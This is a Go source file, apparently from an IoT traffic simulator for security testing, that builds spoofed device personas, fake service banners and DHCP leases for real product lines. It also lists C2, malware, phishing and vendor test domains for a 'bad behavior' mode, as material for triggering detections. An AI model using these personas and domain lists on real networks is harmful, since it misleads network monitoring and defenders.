package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"
)

var (
	iotJSONOutput      bool
	iotBadBehaviorGlob atomic.Bool
	iotStdoutMu        sync.Mutex
	iotLeaseMu         sync.Mutex
	activeIoTDevices   atomic.Int32
	totalIoTPackets    atomic.Int64
	totalIoTBytes      atomic.Int64

	iotDNSCacheMu sync.RWMutex
	iotDNSCache   = make(map[string]iotDNSCacheEntry)
)

type iotDNSCacheEntry struct {
	ip        string
	expiresAt time.Time
}

// resolveDomainIPv4 resolves a domain name to its live IPv4 address (cached for 10 minutes),
// falling back to fallbackIP if resolution fails.
func resolveDomainIPv4(domain, fallbackIP string) string {
	clean := strings.TrimSpace(domain)
	if clean == "" || clean == "iot.cloud.local" {
		return fallbackIP
	}
	now := time.Now()
	iotDNSCacheMu.RLock()
	if entry, ok := iotDNSCache[clean]; ok && now.Before(entry.expiresAt) && entry.ip != "" {
		iotDNSCacheMu.RUnlock()
		return entry.ip
	}
	iotDNSCacheMu.RUnlock()

	ctx, cancel := context.WithTimeout(context.Background(), 1500*time.Millisecond)
	defer cancel()
	addrs, err := net.DefaultResolver.LookupIPAddr(ctx, clean)
	if err == nil {
		for _, a := range addrs {
			if ip4 := a.IP.To4(); ip4 != nil && !ip4.IsLoopback() {
				resolved := ip4.String()
				iotDNSCacheMu.Lock()
				iotDNSCache[clean] = iotDNSCacheEntry{ip: resolved, expiresAt: now.Add(10 * time.Minute)}
				iotDNSCacheMu.Unlock()
				return resolved
			}
		}
	}
	return fallbackIP
}

type IoTGoMetrics struct {
	PID              int     `json:"pid"`
	Goroutines       int     `json:"goroutines"`
	HeapAllocMB      float64 `json:"heap_alloc_mb"`
	SysMemMB         float64 `json:"sys_mem_mb"`
	ActiveIoTDevices int32   `json:"active_iot_devices"`
	TotalIoTPackets  int64   `json:"total_iot_packets"`
	TotalIoTBytes    int64   `json:"total_iot_bytes"`
	Timestamp        int64   `json:"timestamp"`
}

type dhcpLeaseEntry struct {
	IP        string  `json:"ip"`
	Gateway   string  `json:"gateway,omitempty"`
	Timestamp float64 `json:"timestamp"`
}

func getDHCPLeaseFile() string {
	if p := os.Getenv("DHCP_LEASE_FILE"); p != "" {
		return p
	}
	return filepath.Join(getConfigDir(), "dhcp_leases.json")
}

func loadDHCPLeases() map[string]dhcpLeaseEntry {
	iotLeaseMu.Lock()
	defer iotLeaseMu.Unlock()
	out := make(map[string]dhcpLeaseEntry)
	raw, err := os.ReadFile(getDHCPLeaseFile())
	if err != nil {
		return out
	}
	_ = json.Unmarshal(raw, &out)
	return out
}

func getDHCPLease(mac string) (dhcpLeaseEntry, bool) {
	leases := loadDHCPLeases()
	e, ok := leases[mac]
	if !ok {
		e, ok = leases[strings.ToLower(mac)]
	}
	return e, ok
}

func saveDHCPLease(mac, ip, gateway string) {
	iotLeaseMu.Lock()
	defer iotLeaseMu.Unlock()
	leaseFile := getDHCPLeaseFile()
	_ = os.MkdirAll(filepath.Dir(leaseFile), 0755)
	leases := make(map[string]dhcpLeaseEntry)
	if raw, err := os.ReadFile(leaseFile); err == nil {
		_ = json.Unmarshal(raw, &leases)
	}
	leases[mac] = dhcpLeaseEntry{
		IP:        ip,
		Gateway:   gateway,
		Timestamp: float64(time.Now().UnixNano()) / 1e9,
	}
	_ = writeAtomicJSONIndent(leaseFile, leases)
}

func removeDHCPLease(mac string) (dhcpLeaseEntry, bool) {
	iotLeaseMu.Lock()
	defer iotLeaseMu.Unlock()
	leaseFile := getDHCPLeaseFile()
	leases := make(map[string]dhcpLeaseEntry)
	if raw, err := os.ReadFile(leaseFile); err == nil {
		_ = json.Unmarshal(raw, &leases)
	}
	entry, ok := leases[mac]
	if !ok {
		entry, ok = leases[strings.ToLower(mac)]
	}
	delete(leases, mac)
	delete(leases, strings.ToLower(mac))
	delete(leases, strings.ToUpper(mac))
	_ = writeAtomicJSONIndent(leaseFile, leases)
	return entry, ok
}

func emitIoTJSON(msgType string, fields map[string]any) {
	if !iotJSONOutput {
		return
	}
	payload := make(map[string]any, len(fields)+2)
	for k, v := range fields {
		payload[k] = v
	}
	payload["type"] = msgType
	payload["timestamp"] = time.Now().Format("2006-01-02T15:04:05.000000")

	data, err := json.Marshal(payload)
	if err != nil {
		return
	}
	iotStdoutMu.Lock()
	fmt.Println(string(data))
	iotStdoutMu.Unlock()
}

type iotVendorCloud struct {
	Servers []string
	Domains []string
}

var iotCloudDestinations = map[string]iotVendorCloud{
	"Hikvision": {Servers: []string{"47.88.59.64", "39.107.142.200"}, Domains: []string{"hik-connect.com", "hikvision.com"}},
	"Dahua":     {Servers: []string{"47.90.123.45"}, Domains: []string{"dahuasecurity.com", "p2p.dahuasecurity.com"}},
	"Philips":   {Servers: []string{"192.229.211.108"}, Domains: []string{"api.meethue.com", "firmware.meethue.com"}},
	"Xiaomi":    {Servers: []string{"47.88.62.181", "120.92.65.244"}, Domains: []string{"iot.mi.com", "api.io.mi.com"}},
	"Amazon":    {Servers: []string{"52.94.236.248", "54.239.31.128"}, Domains: []string{"alexa.amazon.com", "device-metrics-us.amazon.com"}},
	"Google":    {Servers: []string{"216.58.213.206", "172.217.168.46"}, Domains: []string{"home.nest.com", "googlehomeservices-pa.googleapis.com"}},
	"Sonoff":    {Servers: []string{"18.185.104.23", "52.28.132.157"}, Domains: []string{"eu-api.coolkit.cc", "eu-disp.coolkit.cc"}},
	"TP-Link":   {Servers: []string{"52.41.56.200", "54.148.220.147"}, Domains: []string{"wap.tplinkcloud.com", "use1-api.tplinkra.com"}},
	"Meross":    {Servers: []string{"13.36.125.34"}, Domains: []string{"iot.meross.com", "mqtt.meross.com"}},
	"Samsung":   {Servers: []string{"52.85.83.228", "13.124.199.10"}, Domains: []string{"api.smartthings.com", "graph.api.smartthings.com"}},
}

var (
	iotPublicDNS = []string{"8.8.8.8", "1.1.1.1"}
	iotPublicNTP = []string{"129.6.15.28", "216.239.35.0"}

	iotSuspiciousDomains = []string{
		"update.windows.com",
		"api.github.com",
		"docker.io",
		"gitlab.com",
		"vpn.corporate.example",
		"admin.suspicious-iot.ru",
		"c2.malware-test.org",
		"random-dga-12345.com",
		"torrent-tracker.net",
		"bitcoin-pool.mining.cc",
		"malware-download.xyz",
		"phishing-site.bad",
		"cryptominer.evil",
	}

	iotPANDNSTestDomains = []string{
		"test-malware.testpanw.com",
		"test-phishing.testpanw.com",
		"test-dnstun.testpanw.com",
		"test-ransomware.testpanw.com",
		"test-proxy.testpanw.com",
		"test-grayware.testpanw.com",
		"test-fastflux.testpanw.com",
		"test-nrd.testpanw.com",
		"test-ddns.testpanw.com",
		"test-parked.testpanw.com",
		"test-malicious-nrd.testpanw.com",
		"test-nxns.testpanw.com",
		"test-dangling-domain.testpanw.com",
		"test-dns-rebinding.testpanw.com",
		"test-dns-infiltration.testpanw.com",
		"test-wildcard-abuse.testpanw.com",
		"test-strategically-aged.testpanw.com",
		"test-compromised-dns.testpanw.com",
		"test-adtracking.testpanw.com",
		"test-cname-cloaking.testpanw.com",
		"test-stockpile-domain.testpanw.com",
		"test-squatting.testpanw.com",
		"test-subdomain-reputation.testpanw.com",
		"test-fake-software.testpanw.com",
	}

	iotPANURLTestPaths = []string{
		"/test-malware",
		"/test-phishing",
		"/test-command-and-control",
		"/test-hacking",
		"/test-weapons",
		"/test-adult",
		"/test-gambling",
		"/test-abused-drugs",
	}
)

type iotDHCPFingerprint struct {
	Hostname      string `json:"hostname"`
	VendorClassID string `json:"vendor_class_id"`
	ClientIDType  *int   `json:"client_id_type"`
	ParamReqList  []int  `json:"param_req_list"`
}

type iotFingerprintCfg struct {
	DHCP iotDHCPFingerprint `json:"dhcp"`
}

type iotSecurityCfg struct {
	BadBehavior  bool            `json:"bad_behavior"`
	BehaviorType json.RawMessage `json:"behavior_type"`
}

func (s iotSecurityCfg) ParsedBehaviorTypes() []string {
	if len(s.BehaviorType) == 0 {
		return []string{"random"}
	}
	var list []string
	if err := json.Unmarshal(s.BehaviorType, &list); err == nil && len(list) > 0 {
		return list
	}
	var single string
	if err := json.Unmarshal(s.BehaviorType, &single); err == nil && single != "" {
		return []string{single}
	}
	return []string{"random"}
}

type iotPreviousStats struct {
	PacketsSent   int64            `json:"packets_sent"`
	BytesSent     int64            `json:"bytes_sent"`
	Protocols     map[string]int64 `json:"protocols"`
	UptimeSeconds int64            `json:"uptime_seconds"`
}

type iotVulnMeta struct {
	OS string `json:"os"`
}

type IoTDeviceSpec struct {
	ID              string            `json:"id"`
	Name            string            `json:"name"`
	Vendor          string            `json:"vendor"`
	Type            string            `json:"type"`
	MAC             string            `json:"mac"`
	IPStart         string            `json:"ip_start"`
	Protocols       []string          `json:"protocols"`
	Enabled         *bool             `json:"enabled"`
	TrafficInterval int               `json:"traffic_interval"`
	Gateway         string            `json:"gateway"`
	Description     string            `json:"description"`
	Fingerprint     iotFingerprintCfg `json:"fingerprint"`
	Security        iotSecurityCfg    `json:"security"`
	VulnMeta        *iotVulnMeta      `json:"_vuln_meta"`
	PreviousStats   iotPreviousStats  `json:"previous_stats"`
}

type iotPersona struct {
	Vendor         string
	Model          string
	OS             string
	Firmware       string
	UserAgent      string
	LLDPSystemDesc string
	ServerHeader   string
	OpenPorts      map[uint16][]byte
}

// synthesizePersona builds a complete 4-level OS, Firmware, User-Agent, LLDP description, and Open Port
// banner profile for any IoT device — even when _vuln_meta or explicit firmware info is absent.
func synthesizePersona(spec IoTDeviceSpec) iotPersona {
	vendor := strings.TrimSpace(spec.Vendor)
	devType := strings.TrimSpace(spec.Type)
	devName := strings.TrimSpace(spec.Name)
	if devName == "" {
		devName = spec.ID
	}

	// Level 1: Extract explicit OS if present in _vuln_meta.os or Description ("OS: <value> |")
	explicitOS := ""
	if spec.VulnMeta != nil && strings.TrimSpace(spec.VulnMeta.OS) != "" && spec.VulnMeta.OS != "-" {
		explicitOS = strings.TrimSpace(spec.VulnMeta.OS)
	} else if idx := strings.Index(spec.Description, "OS:"); idx != -1 {
		rest := strings.TrimSpace(spec.Description[idx+3:])
		if pipeIdx := strings.Index(rest, "|"); pipeIdx != -1 {
			explicitOS = strings.TrimSpace(rest[:pipeIdx])
		} else {
			explicitOS = rest
		}
	}

	// OUI-based Vendor enrichment when Vendor is empty/Unknown/Generic
	oui := strings.ToLower(strings.TrimSpace(spec.MAC))
	if len(oui) >= 8 {
		oui = oui[:8]
	}
	if vendor == "" || strings.EqualFold(vendor, "Unknown") || strings.EqualFold(vendor, "Generic") {
		switch oui {
		case "00:a0:03", "00:1b:1b":
			vendor = "Siemens AG"
		case "00:40:8c", "ac:cc:8e":
			vendor = "Axis Communications"
		case "00:a0:98":
			vendor = "NetApp, Inc."
		case "00:1b:17":
			vendor = "Palo Alto Networks, Inc."
		case "b8:27:eb", "dc:a6:32":
			vendor = "Raspberry Pi Foundation"
		case "00:17:88":
			vendor = "Signify"
		case "00:0c:29", "00:50:56":
			vendor = "VMware, Inc."
		}
	}
	if vendor == "" {
		vendor = "Generic"
	}
	if devType == "" {
		devType = "IoT Device"
	}

	combined := strings.ToLower(vendor + " " + devType + " " + devName + " " + explicitOS)

	model := devType
	osName := explicitOS
	fwVer := "v2.4.18"
	ua := ""
	serverHdr := "Embedded-HTTP/2.4"
	var extraPorts []uint16

	// Level 2: Vendor & Product Family Knowledge Base
	switch {
	case strings.Contains(combined, "hikvision"):
		model = "DS-2CD2142FWD-I"
		if osName == "" || strings.EqualFold(osName, "Linux") {
			osName = "Embedded Linux 4.9.38"
		}
		fwVer = "V5.5.82 build 190909"
		ua = fmt.Sprintf("App-webs/5.5.82 (Hikvision; %s; %s; FW/%s; ID/%s)", model, osName, fwVer, devName)
		serverHdr = "App-webs/"
		extraPorts = append(extraPorts, 554)

	case strings.Contains(combined, "axis"):
		model = "AXIS P3245-V"
		if osName == "" || strings.EqualFold(osName, "Axis OS") {
			osName = "AXIS OS 9.80.3.1"
		}
		fwVer = "9.80.3.1"
		ua = fmt.Sprintf("AXIS-VAPIX/9.80.3.1 (Axis Communications; %s; %s; FW/%s)", model, osName, fwVer)
		serverHdr = "Apache/2.4.51 (Unix) AXIS-OS/9.80.3.1"
		extraPorts = append(extraPorts, 554)

	case strings.Contains(combined, "meraki") && strings.Contains(combined, "camera"):
		model = "MV72X Smart Camera"
		osName = "Meraki Vision OS (Linux)"
		fwVer = "MV-4.18.1"
		ua = fmt.Sprintf("Meraki-MV/4.18.1 (Cisco Meraki; %s; %s; FW/%s)", model, osName, fwVer)
		serverHdr = "Meraki-Embedded/4.18.1"
		extraPorts = append(extraPorts, 554)

	case strings.Contains(combined, "rhombus"):
		model = "R200 Dome Camera"
		osName = "Rhombus Embedded Linux"
		fwVer = "2024.08.14.2"
		ua = fmt.Sprintf("RhombusAgent/2024.08.14.2 (Rhombus Systems; %s; Linux aarch64; FW/%s)", model, fwVer)
		serverHdr = "Rhombus-Cam/2024.08"
		extraPorts = append(extraPorts, 554)

	case strings.Contains(combined, "avigilon"):
		model = "ACC7-NVR4-VAL"
		if osName == "" {
			osName = "Windows 8.1/6.10.4.0"
		}
		fwVer = "6.10.4.0"
		ua = fmt.Sprintf("AvigilonControlCenter/6.10.4.0 (Windows NT 6.3; Win64; x64; Avigilon; OS/%s)", osName)
		serverHdr = "Microsoft-IIS/8.5 Avigilon/6.10.4.0"
		extraPorts = append(extraPorts, 554)

	case strings.Contains(combined, "siemens"):
		if strings.Contains(combined, "plc") || strings.Contains(combined, "simatic") {
			model = "SIMATIC S7-1500 CPU 1516-3 PN/DP"
			osName = "SIMATIC Embedded RTOS"
			fwVer = "V2.9.4"
			ua = fmt.Sprintf("SIMATIC-S7-1500/2.9.4 (Siemens AG; %s; 6ES7 516-3AN02-0AB0; FW/%s)", model, fwVer)
			serverHdr = "SIMATIC-S7-Web/2.9.4"
			extraPorts = append(extraPorts, 102, 502)
		} else {
			model = "DESIGO PX PXC100-E.D"
			osName = "Siemens BACnet/IP Embedded"
			fwVer = "V6.30.012"
			ua = fmt.Sprintf("Siemens-Desigo-PX/6.30.012 (Siemens AG; %s; Building Automation; FW/%s)", model, fwVer)
			serverHdr = "Siemens-Embedded-HTTP/6.30"
			extraPorts = append(extraPorts, 102)
		}

	case strings.Contains(combined, "rockwell") || strings.Contains(combined, "allen-bradley"):
		model = "ControlLogix 1756-EN2TR"
		if osName == "" {
			osName = "VxWorks Industrial RTOS"
		}
		fwVer = "v33.011"
		ua = fmt.Sprintf("Rockwell-Logix/33.011 (Rockwell Automation; %s; EtherNet/IP; OS/%s; FW/%s)", model, osName, fwVer)
		serverHdr = "Rockwell-Automation-HTTP/33.011"
		extraPorts = append(extraPorts, 44818)

	case strings.Contains(combined, "fanuc"):
		model = "R-30iB Plus Robot Controller"
		osName = "FANUC System Software"
		fwVer = "V9.40P/23"
		ua = fmt.Sprintf("FANUC-R30iB/9.40P.23 (FANUC Robotics; %s; KAREL/HTTP; FW/%s)", model, fwVer)
		serverHdr = "FANUC-Embedded-Web/9.40P"
		extraPorts = append(extraPorts, 502)

	case strings.Contains(combined, "jbt") || strings.Contains(combined, "agv"):
		model = "SGV Automated Guided Vehicle"
		osName = "VxWorks 6.9 AGV Control"
		fwVer = "v8.4.2"
		ua = fmt.Sprintf("JBT-AGV-Telemetry/8.4.2 (JBT Corporation; %s; FW/%s)", model, fwVer)
		serverHdr = "JBT-Embedded/8.4.2"
		extraPorts = append(extraPorts, 502)

	case strings.Contains(combined, "netapp"):
		model = "FAS8300"
		osName = "NetApp Data ONTAP 9.12.1P2"
		fwVer = "9.12.1P2"
		ua = fmt.Sprintf("NetApp-ONTAP/9.12.1P2 (NetApp, Inc.; %s; %s)", model, osName)
		serverHdr = "NetApp/9.12.1P2"

	case strings.Contains(combined, "f5 networks") || strings.Contains(combined, "big-ip"):
		model = "BIG-IP i4800"
		osName = "F5 TMOS 16.1.3.4"
		fwVer = "16.1.3.4 Build 0.0.5"
		ua = fmt.Sprintf("F5-BIG-IP-iControl/16.1.3.4 (F5 Networks; %s; %s)", model, osName)
		serverHdr = "BIG-IP/16.1.3.4"

	case strings.Contains(combined, "palo alto"):
		if strings.Contains(strings.ToLower(explicitOS), "windows") {
			model = "GlobalProtect Agent"
			osName = explicitOS
			fwVer = "6.1.2-c83"
			ua = fmt.Sprintf("PanGP/6.1.2-c83 (Windows NT 10.0; Palo Alto Networks; %s)", devName)
			serverHdr = "Microsoft-HTTPAPI/2.0"
		} else {
			model = "PA-440"
			osName = "PAN-OS 10.2.8-h3"
			fwVer = "10.2.8-h3"
			ua = fmt.Sprintf("PanOS-Telemetry/10.2.8-h3 (Palo Alto Networks; %s; %s)", model, osName)
			serverHdr = "PanWebServer/10.2.8-h3"
		}

	case strings.Contains(combined, "schneider") || strings.Contains(combined, "apc ") || strings.Contains(combined, "smart-ups"):
		model = "Smart-UPS SRT 5000 (AP9641)"
		osName = "APC AOS v6.9.6"
		fwVer = "v6.9.6"
		ua = fmt.Sprintf("APC-NMC3/6.9.6 (Schneider Electric; %s; %s; App/sumx v6.9.6)", model, osName)
		serverHdr = "Allegro-Software-RomPager/4.60 APC-AOS/6.9.6"
		extraPorts = append(extraPorts, 502)

	case strings.Contains(combined, "cisco"):
		if strings.Contains(combined, "switch") || strings.Contains(combined, "industrial") {
			model = "Catalyst IE-4000-8GT4G-E"
			if osName == "" {
				osName = "Cisco IOS 15.2(4)EA9"
			}
			fwVer = "15.2(4)EA9"
			ua = fmt.Sprintf("Cisco-IOS/15.2(4)EA9 (Cisco Systems; %s; %s)", model, osName)
			serverHdr = "cisco-IOS/15.2(4)EA9"
		} else {
			model = "CP-8845 IP Phone"
			osName = "Cisco Voice OS"
			fwVer = "sip8845.12-8-1-0001-455"
			ua = fmt.Sprintf("Cisco-CP8845/12.8.1 (Cisco Systems; %s; FW/%s)", model, fwVer)
			serverHdr = "Cisco-VoIP-HTTP/12.8.1"
		}

	case strings.Contains(combined, "poly"):
		model = "Poly Studio X50"
		if osName == "" {
			osName = "Poly VideoOS 4.1.1"
		}
		fwVer = "4.1.1-382114"
		ua = fmt.Sprintf("Poly-VideoOS/4.1.1.382114 (Poly Inc.; %s; %s; UC-Software/6.4.3)", model, osName)
		serverHdr = "Poly-Web/4.1.1"

	case strings.Contains(combined, "xbox"):
		model = "Xbox Series X / One"
		osName = "Xbox System OS 10.0.25398"
		fwVer = "10.0.25398.2923"
		ua = fmt.Sprintf("XboxLiveClient/10.0.25398.2923 (Windows NT 10.0; Xbox One; Microsoft Corporation; %s)", devName)
		serverHdr = "Microsoft-HTTPAPI/2.0"

	case strings.Contains(combined, "hue") || strings.Contains(combined, "signify") || strings.Contains(combined, "philips"):
		model = "BSB002 Hue Bridge v2"
		osName = "OpenWrt Embedded Linux"
		fwVer = "1960062030"
		ua = fmt.Sprintf("HueBridge/1960062030 (Signify; %s; API/1.60.0; Linux mips)", model)
		serverHdr = "nginx/1.21.3 HueBridge/1.60.0"

	case strings.Contains(combined, "raspberry"):
		model = "Raspberry Pi 4 Model B"
		osName = "Raspberry Pi OS (Debian 12 Bookworm)"
		fwVer = "6.6.20+rpt-rpi-v8"
		ua = fmt.Sprintf("RPi-Telemetry/6.6.20 (Raspberry Pi Foundation; %s; Linux aarch64; FW/%s)", model, fwVer)
		serverHdr = "lighttpd/1.4.69 (Raspberry-Pi-OS)"

	case strings.Contains(combined, "hp-printer") || strings.Contains(combined, "hp inc"):
		model = "LaserJet Enterprise M611dn"
		osName = "HP FutureSmart LynxOS"
		fwVer = "2506087_029612"
		ua = fmt.Sprintf("HP-FutureSmart/5.6.0.1 (HP Inc.; %s; %s; JetDirect/J8031E; FW/%s)", model, osName, fwVer)
		serverHdr = "HP-ChaiSOE/1.0"
		extraPorts = append(extraPorts, 9100)

	case strings.Contains(combined, "sharp"):
		model = "MX-4071 Multifunction"
		osName = "ThreadX RTOS"
		fwVer = "05.00.N2"
		ua = fmt.Sprintf("SHARP-MFP/05.00.N2 (SHARP Corporation; %s; %s; FW/%s)", model, osName, fwVer)
		serverHdr = "RapidLogic/1.1 SHARP-MX/05.00.N2"
		extraPorts = append(extraPorts, 9100)

	case strings.Contains(combined, "lenel"):
		model = "OnGuard LNL-4420"
		if osName == "" {
			osName = "Windows 8.1 Embedded"
		}
		fwVer = "OnGuard 7.6.342"
		ua = fmt.Sprintf("Lenel-OnGuard/7.6.342 (LenelS2; %s; Windows NT 6.3; AccessControl; OS/%s)", model, osName)
		serverHdr = "Microsoft-IIS/8.5 Lenel-OnGuard/7.6"

	case strings.Contains(combined, "profusion") || strings.Contains(combined, "mood media"):
		model = "ProFusion iS Digital Signage"
		osName = "Mood Embedded Linux 2.30.0"
		fwVer = "2.30.0-build418"
		ua = fmt.Sprintf("ProFusion-iS/2.30.0 (Mood Media; %s; Linux x86_64; FW/%s)", model, fwVer)
		serverHdr = "Apache/2.4.38 (Mood-ProFusion/2.30.0)"

	case strings.Contains(combined, "proxmox"):
		model = "Proxmox VE Hypervisor"
		osName = "Debian GNU/Linux 12 (PVE)"
		fwVer = "pve-manager/8.1.4"
		ua = fmt.Sprintf("PVE-API-Client/8.1.4 (Proxmox Server Solutions GmbH; Linux 6.5.11-8-pve; x86_64)")
		serverHdr = "pve-api-daemon/3.0"

	case strings.Contains(combined, "ibm"):
		model = "System x3650 M5"
		osName = "Windows Server 2016 (NT 10.0)"
		fwVer = "IMM2 v6.80"
		ua = fmt.Sprintf("IBM-IMM2/6.80 (IBM Corporation; %s; Windows NT 10.0; Win64; x64)", model)
		serverHdr = "IBM-HTTP-Server/9.0"

	case strings.Contains(combined, "amazon") || strings.Contains(combined, "echo"):
		model = "Echo Dot (5th Gen)"
		osName = "Fire OS 8.3.1.9 (Android 11)"
		fwVer = "9698494596"
		ua = fmt.Sprintf("Dalvik/2.1.0 (Linux; U; Android 11; AEOBC Build/NS6294; FireOS/8.3.1.9; Amazon Echo; %s)", devName)
		serverHdr = "Amazon-Embedded/8.3"

	case strings.Contains(combined, "chromecast") || strings.Contains(combined, "google"):
		model = "Chromecast 4K"
		osName = "Android TV 12"
		fwVer = "1.68.374976"
		ua = fmt.Sprintf("CrKey/1.68.374976 (Linux; Android 12; Chromecast; Build/STTE.231215.005; Google Inc.)")
		serverHdr = "Eureka-HTTP/1.68"

	default:
		// Level 3: Synthesize by OS family or Device Type keywords (for user-created or unknown vendor devices)
		switch {
		case strings.Contains(strings.ToLower(explicitOS), "windows 7"):
			osName = "Windows 7 SP1 (NT 6.1)"
			fwVer = "6.1.7601"
			ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 6.1; Win64; x64) %s/%s (%s; %s)", strings.ReplaceAll(devName, " ", "-"), fwVer, vendor, devType)
			serverHdr = "Microsoft-IIS/7.5"
		case strings.Contains(strings.ToLower(explicitOS), "windows 8"):
			osName = "Windows 8.1 (NT 6.3)"
			fwVer = "6.3.9600"
			ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 6.3; Win64; x64) %s/%s (%s; %s)", strings.ReplaceAll(devName, " ", "-"), fwVer, vendor, devType)
			serverHdr = "Microsoft-IIS/8.5"
		case strings.Contains(strings.ToLower(explicitOS), "windows"):
			osName = "Windows 10 Pro (NT 10.0)"
			fwVer = "10.0.19045"
			ua = fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) %s/%s (%s; %s)", strings.ReplaceAll(devName, " ", "-"), fwVer, vendor, devType)
			serverHdr = "Microsoft-IIS/10.0"
		case strings.Contains(combined, "camera") || strings.Contains(combined, "nvr") || strings.Contains(combined, "video"):
			model = "ONVIF Network Camera"
			osName = "Embedded Linux 4.14"
			fwVer = "v4.32.1-onvif"
			ua = fmt.Sprintf("ONVIF-Camera/4.32.1 (%s; %s; %s; FW/%s)", vendor, model, osName, fwVer)
			serverHdr = "GoAhead-Webs/2.5.0 ONVIF/4.32.1"
			extraPorts = append(extraPorts, 554)
		case strings.Contains(combined, "plc") || strings.Contains(combined, "scada") || strings.Contains(combined, "industrial"):
			model = "ICS RTU Controller"
			osName = "VxWorks RTOS 7.0"
			fwVer = "v3.14.2"
			ua = fmt.Sprintf("ICS-Controller/3.14.2 (%s; %s; %s; FW/%s)", vendor, model, osName, fwVer)
			serverHdr = "WindRiver-WebServer/4.7"
			extraPorts = append(extraPorts, 502)
		case strings.Contains(combined, "printer") || strings.Contains(combined, "mfp"):
			model = "Network Enterprise Printer"
			osName = "ThreadX RTOS"
			fwVer = "v240806"
			ua = fmt.Sprintf("Embedded-Printer/240806 (%s; %s; %s; FW/%s)", vendor, model, osName, fwVer)
			serverHdr = "gSOAP/2.8 JetDirect/240806"
			extraPorts = append(extraPorts, 9100)
		case strings.Contains(combined, "medical") || strings.Contains(combined, "infusion") || strings.Contains(combined, "mri") || strings.Contains(combined, "patient"):
			model = "Clinical Telemetry Unit"
			osName = "VxWorks Medical RTOS 6.9"
			fwVer = "v5.2.1-med"
			ua = fmt.Sprintf("MedDevice-Telemetry/5.2.1 (%s; %s; %s; FW/%s)", vendor, model, osName, fwVer)
			serverHdr = "MedEmbedded-HTTP/5.2.1"
		default:
			// Level 4: Universal Fallback
			if osName == "" {
				osName = "Embedded Linux 5.10.160"
			}
			fwVer = "v2.4.18"
			vc := strings.TrimSpace(spec.Fingerprint.DHCP.VendorClassID)
			if vc == "" {
				vc = "Embedded-IoT"
			}
			ua = fmt.Sprintf("%s/2.4.18 (%s; %s; OS/%s; FW/%s; ID/%s)", strings.ReplaceAll(vc, " ", "-"), vendor, devType, osName, fwVer, spec.ID)
			serverHdr = fmt.Sprintf("%s/2.4.18 (%s)", strings.ReplaceAll(vc, " ", "-"), osName)
		}
	}

	lldpDesc := fmt.Sprintf("%s %s (%s) | OS: %s | FW: %s", vendor, model, devName, osName, fwVer)

	// Build open TCP port map & authentic server banners for inbound scan/probe responder
	openPorts := make(map[uint16][]byte)
	httpBody := fmt.Sprintf(
		`{"device_id":%q,"name":%q,"vendor":%q,"model":%q,"type":%q,"os":%q,"firmware":%q,"mac":%q,"status":"online"}`+"\n",
		spec.ID, devName, vendor, model, devType, osName, fwVer, spec.MAC,
	)
	httpResp := fmt.Sprintf(
		"HTTP/1.1 200 OK\r\nServer: %s\r\nContent-Type: application/json\r\nX-Device-Vendor: %s\r\nX-Device-Firmware: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s",
		serverHdr, vendor, fwVer, len(httpBody), httpBody,
	)
	openPorts[80] = []byte(httpResp)

	// Add protocol-configured ports
	for _, p := range spec.Protocols {
		switch strings.ToLower(strings.TrimSpace(p)) {
		case "rtsp":
			extraPorts = append(extraPorts, 554)
		case "mqtt":
			extraPorts = append(extraPorts, 1883)
		}
	}

	for _, port := range extraPorts {
		switch port {
		case 554:
			rtspResp := fmt.Sprintf(
				"RTSP/1.0 200 OK\r\nCSeq: 1\r\nServer: %s (%s)\r\nPublic: OPTIONS, DESCRIBE, SETUP, TEARDOWN, PLAY, PAUSE\r\n\r\n",
				serverHdr, fwVer,
			)
			openPorts[554] = []byte(rtspResp)
		case 1883:
			// MQTT v3.1.1 CONNACK (Connection Accepted)
			openPorts[1883] = []byte{0x20, 0x02, 0x00, 0x00}
		case 102:
			// Siemens ISO-TSAP / S7comm COTP Connection Confirm (TPKT + COTP CC)
			openPorts[102] = []byte{0x03, 0x00, 0x00, 0x0b, 0x06, 0xd0, 0x00, 0x01, 0x00, 0x02, 0x00}
		case 502:
			// Modbus TCP Read Holding Registers Response
			openPorts[502] = []byte{0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x01, 0x03, 0x02, 0x00, 0x64}
		case 9100:
			// Printer PJL INFO ID banner
			pjl := fmt.Sprintf("@PJL INFO ID\r\n\"%s %s (%s)\"\r\n\x0c", vendor, model, fwVer)
			openPorts[9100] = []byte(pjl)
		case 44818:
			// EtherNet/IP ListIdentity Response header
			openPorts[44818] = []byte{0x63, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
		}
	}

	return iotPersona{
		Vendor:         vendor,
		Model:          model,
		OS:             osName,
		Firmware:       fwVer,
		UserAgent:      ua,
		LLDPSystemDesc: lldpDesc,
		ServerHeader:   serverHdr,
		OpenPorts:      openPorts,
	}
}

type iotDeviceRunner struct {
	spec           IoTDeviceSpec
	persona        iotPersona
	rawEng         *iotRawEngine
	dhcpMode       string
	macBytes       [6]byte
	ctx            context.Context
	cancel         context.CancelFunc
	startTime      time.Time
	previousUptime int64

	mu                sync.RWMutex
	currentIP         string
	gatewayIP         string
	running           bool
	badBehaviorActive bool
	badBehaviorCancel context.CancelFunc
	packetsSent       int64
	bytesSent         int64
	protoCounts       map[string]int64
}

func newIoTDeviceRunner(parentCtx context.Context, spec IoTDeviceSpec, rawEng *iotRawEngine, dhcpMode string) (*iotDeviceRunner, error) {
	if spec.TrafficInterval <= 0 {
		spec.TrafficInterval = 60
	}
	macBytes, err := parseMAC(spec.MAC)
	if err != nil {
		return nil, err
	}
	ctx, cancel := context.WithCancel(parentCtx)
	protos := make(map[string]int64)
	for _, p := range spec.Protocols {
		protos[p] = 0
	}
	for k, v := range spec.PreviousStats.Protocols {
		protos[k] = v
	}

	return &iotDeviceRunner{
		spec:           spec,
		persona:        synthesizePersona(spec),
		rawEng:         rawEng,
		dhcpMode:       dhcpMode,
		macBytes:       macBytes,
		ctx:            ctx,
		cancel:         cancel,
		previousUptime: spec.PreviousStats.UptimeSeconds,
		currentIP:      spec.IPStart,
		gatewayIP:      spec.Gateway,
		packetsSent:    spec.PreviousStats.PacketsSent,
		bytesSent:      spec.PreviousStats.BytesSent,
		protoCounts:    protos,
	}, nil
}

